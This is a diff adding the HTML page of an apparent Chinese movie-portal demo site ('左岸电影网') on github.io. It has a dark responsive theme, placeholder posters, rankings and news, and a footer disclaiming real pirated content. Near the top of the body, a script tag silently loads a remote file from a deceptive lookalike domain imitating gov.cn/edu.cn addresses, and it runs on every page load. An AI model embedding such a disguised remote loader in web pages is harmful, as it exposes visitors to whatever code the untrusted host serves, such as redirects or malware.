@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>左岸电影网 - 高清电影在线观看 | zuoandianyingwang-h5.github.io</title>
+<meta name="description" content="左岸电影网（zuoandianyingwang-h5.github.io）提供最新电影、热播剧集、综艺动漫、影视资讯与精选专题，移动端自适应，免费高清在线观看。" />
+<meta name="keywords" content="左岸电影网,zuoandianyingwang-h5,高清电影,最新电影,热播剧集,综艺动漫,影视资讯" />
+<link rel="canonical" href="https://zuoandianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0b1020;--bg2:#121a33;--card:#172041;--line:#26315c;
+  --txt:#eaf0ff;--sub:#9fb0d8;--pri:#7c5cff;--pri2:#22d3ee;--gold:#ffd166;
+  --radius:18px;--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:radial-gradient(1200px 600px at 80% -10%,rgba(124,92,255,.25),transparent 60%),
+             radial-gradient(900px 500px at -10% 10%,rgba(34,211,238,.18),transparent 55%),
+             var(--bg);
+  color:var(--txt);line-height:1.6;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+header.site{
+  position:sticky;top:0;z-index:50;
+  backdrop-filter:saturate(140%) blur(10px);
+  background:linear-gradient(180deg,rgba(11,16,32,.92),rgba(11,16,32,.72));
+  border-bottom:1px solid var(--line);
+}
+.nav{display:flex;align-items:center;gap:14px;height:62px}
+.logo{font-weight:800;font-size:20px;letter-spacing:.5px;
+  background:linear-gradient(90deg,var(--pri),var(--pri2));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{display:block;font-size:11px;color:var(--sub);font-weight:600;letter-spacing:0}
+.menu{margin-left:auto;display:flex;gap:6px;flex-wrap:wrap}
+.menu a{padding:8px 12px;border-radius:999px;color:var(--sub);font-size:14px}
+.menu a:hover{color:#fff;background:rgba(255,255,255,.06)}
+.search{display:flex;gap:8px;align-items:center}
+.search input{
+  width:180px;padding:9px 12px;border-radius:999px;border:1px solid var(--line);
+  background:#0e1530;color:#fff;outline:none
+}
+.search button{border:0;padding:9px 14px;border-radius:999px;cursor:pointer;
+  background:linear-gradient(90deg,var(--pri),var(--pri2));color:#06122b;font-weight:700}
+.burger{display:none;margin-left:auto;background:#0e1530;border:1px solid var(--line);
+  color:#fff;border-radius:12px;padding:8px 12px;font-size:18px}
+
+.hero{position:relative;margin:22px 0 10px;border-radius:24px;overflow:hidden;
+  border:1px solid var(--line);min-height:340px;
+  background:linear-gradient(120deg,#1b2350,#2a1b4d 55%,#102a3a)}
+.hero .slide{position:absolute;inset:0;opacity:0;transition:opacity .6s ease;
+  padding:42px;display:flex;flex-direction:column;justify-content:flex-end}
+.hero .slide.active{opacity:1;position:relative}
+.hero h1{font-size:34px;margin:0 0 8px}
+.hero p{color:#dbe4ff;max-width:620px;margin:0 0 16px}
+.tag{display:inline-block;padding:4px 10px;border-radius:999px;font-size:12px;
+  background:rgba(255,255,255,.12);margin-right:8px}
+.cta{padding:11px 18px;border-radius:999px;font-weight:700;
+  background:linear-gradient(90deg,var(--gold),#ff9d6c);color:#231500;width:max-content}
+.dots{position:absolute;right:18px;bottom:18px;display:flex;gap:8px}
+.dots i{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,.35);cursor:pointer}
+.dots i.on{background:var(--pri2)}
+
+.section{padding:34px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px}
+.sec-head h2{font-size:24px;margin:0}
+.sec-head span{color:var(--sub);font-size:13px}
+.more{margin-left:auto;color:var(--pri2);font-size:13px}
+
+.grid-poster{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.poster{position:relative;border-radius:16px;overflow:hidden;background:var(--card);
+  border:1px solid var(--line);transition:transform .25s ease,box-shadow .25s ease}
+.poster:hover{transform:translateY(-4px);box-shadow:0 18px 40px rgba(0,0,0,.45)}
+.poster .ph{aspect-ratio:2/3;background:linear-gradient(160deg,#283366,#3a2a66)}
+.poster .meta{padding:10px 12px}
+.poster h3{font-size:14px;margin:0 0 4px}
+.poster .rate{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.6);
+  color:var(--gold);font-weight:800;padding:3px 8px;border-radius:10px;font-size:12px}
+.poster .badge{position:absolute;top:10px;right:10px;background:var(--pri);
+  color:#fff;font-size:11px;padding:3px 8px;border-radius:10px}
+
+.cats{display:grid;grid-template-columns:repeat(6,1fr);gap:14px}
+.cat{border-radius:16px;padding:22px 16px;text-align:center;font-weight:700;color:#06122b;
+  border:1px solid rgba(255,255,255,.12)}
+.cat:nth-child(1){background:linear-gradient(135deg,#7c5cff,#22d3ee)}
+.cat:nth-child(2){background:linear-gradient(135deg,#ff6b9d,#ffd166)}
+.cat:nth-child(3){background:linear-gradient(135deg,#34d399,#22d3ee)}
+.cat:nth-child(4){background:linear-gradient(135deg,#f97316,#ffd166)}
+.cat:nth-child(5){background:linear-gradient(135deg,#60a5fa,#a78bfa)}
+.cat:nth-child(6){background:linear-gradient(135deg,#f43f5e,#fb923c)}
+
+.rank{display:grid;grid-template-columns:1.1fr 1fr;gap:18px}
+.rank-hero{border-radius:18px;overflow:hidden;border:1px solid var(--line);
+  background:linear-gradient(160deg,#241b4d,#102a3a);padding:22px}
+.rank-list{display:flex;flex-direction:column;gap:10px}
+.rrow{display:flex;align-items:center;gap:12px;background:var(--card);
+  border:1px solid var(--line);border-radius:14px;padding:10px 12px}
+.rnum{width:30px;height:30px;flex:0 0 30px;border-radius:9px;display:grid;place-items:center;
+  font-weight:800;background:#0e1530;color:var(--sub)}
+.rrow:nth-child(1) .rnum{background:linear-gradient(135deg,#ffd700,#ff9d00);color:#231500}
+.rrow:nth-child(2) .rnum{background:linear-gradient(135deg,#d7e3ff,#9fb0d8);color:#10203f}
+.rrow:nth-child(3) .rnum{background:linear-gradient(135deg,#ff9d6c,#c9772f);color:#231500}
+.rthumb{width:56px;height:76px;border-radius:10px;background:linear-gradient(160deg,#2a3566,#46307a)}
+.rrow h4{margin:0;font-size:14px}
+.rrow p{margin:2px 0 0;font-size:12px;color:var(--sub)}
+
+.hscroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:8px;scrollbar-width:thin}
+.hscroll::-webkit-scrollbar{height:8px}
+.hscroll::-webkit-scrollbar-thumb{background:#2a3566;border-radius:99px}
+.hcard{flex:0 0 220px;background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.hcard .ph{aspect-ratio:16/9;background:linear-gradient(160deg,#27305e,#3b2a63)}
+.hcard .meta{padding:10px 12px}
+.hcard h3{font-size:14px;margin:0}
+.prog{height:6px;background:#0e1530;border-radius:99px;margin-top:8px;overflow:hidden}
+.prog i{display:block;height:100%;background:linear-gradient(90deg,var(--pri),var(--pri2))}
+
+.news{display:grid;grid-template-columns:1.4fr 1fr;gap:18px}
+.news-hero{border-radius:18px;overflow:hidden;border:1px solid var(--line);
+  background:linear-gradient(160deg,#1d2750,#33224d);padding:22px}
+.news-list{display:flex;flex-direction:column;gap:10px}
+.nrow{display:flex;gap:12px;background:var(--card);border:1px solid var(--line);
+  border-radius:14px;padding:10px}
+.nthumb{width:84px;height:60px;border-radius:10px;flex:0 0 84px;
+  background:linear-gradient(160deg,#2a3566,#46307a)}
+.nrow h4{margin:0;font-size:14px}
+.nrow span{font-size:12px;color:var(--sub)}
+
+.collage{display:grid;grid-template-columns:2fr 1fr 1fr;grid-auto-rows:160px;gap:14px}
+.cg{border-radius:18px;overflow:hidden;border:1px solid var(--line);padding:18px;color:#fff;
+  background:linear-gradient(160deg,#2a2350,#102a3a)}
+.cg.big{grid-row:span 2}
+.cg h3{margin:0 0 6px;font-size:18px}
+.cg p{margin:0;color:#d7e0ff;font-size:13px}
+
+.about{display:grid;grid-template-columns:1.3fr 1fr;gap:18px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:10px}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;text-align:center}
+.stat b{font-size:24px;background:linear-gradient(90deg,var(--pri),var(--pri2));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.form{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px}
+.form input,.form textarea{width:100%;padding:11px 12px;border-radius:12px;border:1px solid var(--line);
+  background:#0e1530;color:#fff;margin-bottom:10px;outline:none}
+.form button{border:0;width:100%;padding:12px;border-radius:12px;cursor:pointer;font-weight:800;
+  background:linear-gradient(90deg,var(--pri),var(--pri2));color:#06122b}
+
+footer.site{border-top:1px solid var(--line);padding:26px 0 40px;color:var(--sub);font-size:13px}
+footer.site a{color:var(--pri2)}
+
+@media (max-width:980px){
+  .grid-poster{grid-template-columns:repeat(4,1fr)}
+  .cats{grid-template-columns:repeat(3,1fr)}
+  .rank,.news,.about{grid-template-columns:1fr}
+  .collage{grid-template-columns:1fr 1fr}
+  .cg.big{grid-row:auto}
+}
+@media (max-width:720px){
+  .menu{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;
+    background:#0b1020;border-bottom:1px solid var(--line);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}
+  .burger{display:block}
+  .search input{width:120px}
+  .hero{padding:0}
+  .hero .slide{padding:26px 18px}
+  .hero h1{font-size:26px}
+  .grid-poster{grid-template-columns:repeat(2,1fr)}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .collage{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">左岸电影网<small>zuoandianyingwang-h5.github.io</small></div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#new">最新电影</a>
+      <a href="#cats">影片分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#drama">剧集综艺</a>
+      <a href="#news">影视资讯</a>
+      <a href="#topic">精选专题</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="搜索电影/剧集" aria-label="搜索" />
+      <button type="button" onclick="alert('演示站点：搜索功能用 # 占位')">搜索</button>
+    </div>
+    <button class="burger" id="burger" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- ① 首屏轮播 -->
+  <section class="hero" id="home" aria-label="焦点推荐">
+    <div class="slide active">
+      <span class="tag">4K 高清</span><span class="tag">左岸独播</span>
+      <h1>左岸电影网 · 城市光影计划</h1>
+      <p>最新院线、文艺片、悬疑剧、动漫番剧一站看完，移动端丝滑自适应，免费高清不卡顿。</p>
+      <a class="cta" href="#">立即观看</a>
+    </div>
+    <div class="slide">
+      <span class="tag">本周热推</span><span class="tag">豆瓣高分</span>
+      <h1>深夜放映室：悬疑 / 犯罪 / 治愈</h1>
+      <p>从街头巷尾到海岸灯塔，左岸片单帮你挑出值得熬夜看完的好故事。</p>
+      <a class="cta" href="#">查看片单</a>
+    </div>
+    <div class="slide">
+      <span class="tag">剧集更新</span><span class="tag">综艺动漫</span>
+      <h1>左岸剧场：追剧不迷路</h1>
+      <p>热播美剧、国产剧、韩剧、国创动漫同步更新，更新进度一目了然。</p>
+      <a class="cta" href="#">进入剧场</a>
+    </div>
+    <div class="dots" id="dots">
+      <i class="on"></i><i></i><i></i>
+    </div>
+  </section>
+
+  <!-- ② 最新电影 -->
+  <section class="section" id="new">
+    <div class="sec-head">
+      <h2>最新电影</h2><span>Latest Movies</span>
+      <a class="more" href="#">更多 #</a>
+    </div>
+    <div class="grid-poster">
+      <article class="poster"><div class="ph"></div><span class="rate">8.7</span><span class="badge">NEW</span><div class="meta"><h3>霓虹左岸</h3><p>悬疑 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.2</span><div class="meta"><h3>海边邮局</h3><p>文艺 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">9.0</span><span class="badge">HOT</span><div class="meta"><h3>午夜列车</h3><p>犯罪 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">7.9</span><div class="meta"><h3>橘色夏天</h3><p>青春 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.4</span><div class="meta"><h3>雾港来信</h3><p>剧情 / 2026</p></div></article>
+      <article class="poster"><div class="ph"></div><span class="rate">8.8</span><span class="badge">4K</span><div class="meta"><h3>银河修补匠</h3><p>科幻 / 2026</p></div></article>
+    </div>
+  </section>
+
+  <!-- ③ 影片分类 -->
+  <section class="section" id="cats">
+    <div class="sec-head"><h2>影片分类</h2><span>Categories</span></div>
+    <div class="cats">
+      <a class="cat" href="#">动作大片</a>
+      <a class="cat" href="#">悬疑犯罪</a>
+      <a class="cat" href="#">科幻未来</a>
+      <a class="cat" href="#">青春治愈</a>
+      <a class="cat" href="#">文艺剧情</a>
+      <a class="cat" href="#">动漫番剧</a>
+    </div>
+  </section>
+
+  <!-- ④ 热播榜单 -->
+  <section class="section" id="rank">
+    <div class="sec-head"><h2>热播榜单</h2><span>Top Charts</span><a class="more" href="#">完整榜单 #</a></div>
+    <div class="rank">
+      <div class="rank-hero">
+        <span class="tag">NO.1 本周冠军</span>
+        <h3 style="font-size:22px;margin:10px 0">左岸之夜</h3>
+        <p style="color:#dbe4ff">一座城、一条江、一群追光的人。豆瓣 9.1，院线续作独家上线。</p>
+        <a class="cta" href="#">播放正片</a>
+      </div>
+      <div class="rank-list">
+        <div class="rrow"><div class="rnum">1</div><div class="rthumb"></div><div><h4>左岸之夜</h4><p>热度 98210 · 悬疑</p></div></div>
+        <div class="rrow"><div class="rnum">2</div><div class="rthumb"></div><div><h4>霓虹左岸</h4><p>热度 87420 · 犯罪</p></div></div>
+        <div class="rrow"><div class="rnum">3</div><div class="rthumb"></div><div><h4>海边邮局</h4><p>热度 80115 · 文艺</p></div></div>
+        <div class="rrow"><div class="rnum">4</div><div class="rthumb"></div><div><h4>午夜列车</h4><p>热度 76540 · 剧情</p></div></div>
+        <div class="rrow"><div class="rnum">5</div><div class="rthumb"></div><div><h4>橘色夏天</h4><p>热度 73210 · 青春</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑤ 剧集 / 综艺 / 动漫 -->
+  <section class="section" id="drama">
+    <div class="sec-head"><h2>剧集 · 综艺 · 动漫</h2><span>Drama / Variety / Anime</span><a class="more" href="#">更多 #</a></div>
+    <div class="hscroll">
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>江雾谜案 第8集</h3><div class="prog"><i style="width:64%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>左岸音乐会 S2</h3><div class="prog"><i style="width:40%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>银河修补匠 第12集</h3><div class="prog"><i style="width:82%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>橘色夏天 第5集</h3><div class="prog"><i style="width:50%"></i></div></div></div>
+      <div class="hcard"><div class="ph"></div><div class="meta"><h3>雾港来信 第3集</h3><div class="prog"><i style="width:28%"></i></div></div></div>
+    </div>
+  </section>
+
+  <!-- ⑥ 影视资讯 -->
+  <section class="section" id="news">
+    <div class="sec-head"><h2>影视资讯</h2><span>News</span><a class="more" href="#">全部资讯 #</a></div>
+    <div class="news">
+      <div class="news-hero">
+        <span class="tag">独家</span>
+        <h3 style="font-size:22px;margin:10px 0">左岸电影网 2026 城市光影片单发布</h3>
+        <p style="color:#dbe4ff">从独立导演短片到 4K 修复经典，本季片单更强调「城市、江岸、夜色、人情」四条线索。</p>
+        <a class="cta" href="#">阅读全文</a>
+      </div>
+      <div class="news-list">
+        <div class="nrow"><div class="nthumb"></div><div><h4>悬疑片为什么越拍越短？</h4><span>2026-10-09 · 影评</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>国产动漫出海这三步很关键</h4><span>2026-10-08 · 产业</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>左岸独家：导演访谈录</h4><span>2026-10-07 · 专访</span></div></div>
+        <div class="nrow"><div class="nthumb"></div><div><h4>4K 修复版胶片色彩怎么调</h4><span>2026-10-06 · 技术</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑦ 精选专题 -->
+  <section class="section" id="topic">
+    <div class="sec-head"><h2>精选专题</h2><span>Collections</span><a class="more" href="#">更多专题 #</a></div>
+    <div class="collage">
+      <div class="cg big"><h3>夜色里的城市</h3><p>霓虹、雨夜、渡口、便利店——一组关于都市孤独与温柔的片单。</p><a class="cta" href="#">进入专题</a></div>
+      <div class="cg"><h3>出海动漫</h3><p>国创 / 日番 / 美漫</p></div>
+      <div class="cg"><h3>治愈系</h3><p>夏天 / 信 / 猫</p></div>
+      <div class="cg"><h3>硬核悬疑</h3><p>推理 / 犯罪 / 反转</p></div>
+      <div class="cg"><h3>4K 修复</h3><p>老片新看</p></div>
+    </div>
+  </section>
+
+  <!-- ⑧ 关于我们 -->
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于我们</h2><span>About</span></div>
+    <div class="about">
+      <div>
+        <p style="color:#dbe4ff">左岸电影网（zuoandianyingwang-h5.github.io）是一个演示型影视导航站点，聚焦「最新电影、热播剧集、综艺动漫、影视资讯、精选专题」等内容组织方式，强调移动端自适应与清晰的信息架构。</p>
+        <div class="stats">
+          <div class="stat"><b>12000+</b><br>影片条目</div>
+          <div class="stat"><b>320+</b><br>剧集综艺</div>
+          <div class="stat"><b>98%</b><br>移动端适配</div>
+        </div>
+      </div>
+      <form class="form" onsubmit="event.preventDefault();alert('演示提交：留言已占位');">
+        <h3 style="margin:0 0 10px">影迷留言</h3>
+        <input type="text" placeholder="昵称" aria-label="昵称" />
+        <input type="email" placeholder="邮箱（演示）" aria-label="邮箱" />
+        <textarea rows="3" placeholder="想看的片子 / 建议" aria-label="留言"></textarea>
+        <button type="submit">提交留言</button>
+      </form>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    左岸电影网 · <a href="https://zuoandianyingwang-h5.github.io/">zuoandianyingwang-h5.github.io</a><br/>
+    演示页面：所有播放 / 详情 / 分类链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 左岸电影网 Demo. 仅用于静态站结构 / SEO / 移动端适配演示。
+  </div>
+</footer>
+
+<script>
+  // 移动端菜单
+  const burger=document.getElementById('burger');
+  const menu=document.getElementById('menu');
+  burger.addEventListener('click',()=>menu.classList.toggle('open'));
+  menu.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>menu.classList.remove('open')));
+
+  // 首屏轮播
+  const slides=[...document.querySelectorAll('.hero .slide')];
+  const dots=[...document.querySelectorAll('#dots i')];
+  let cur=0;
+  function show(i){
+    slides.forEach((s,k)=>s.classList.toggle('active',k===i));
+    dots.forEach((d,k)=>d.classList.toggle('on',k===i));
+    cur=i;
+  }
+  dots.forEach((d,i)=>d.addEventListener('click',()=>show(i)));
+  setInterval(()=>show((cur+1)%slides.length),4500);
+</script>
+</body>
+</html>
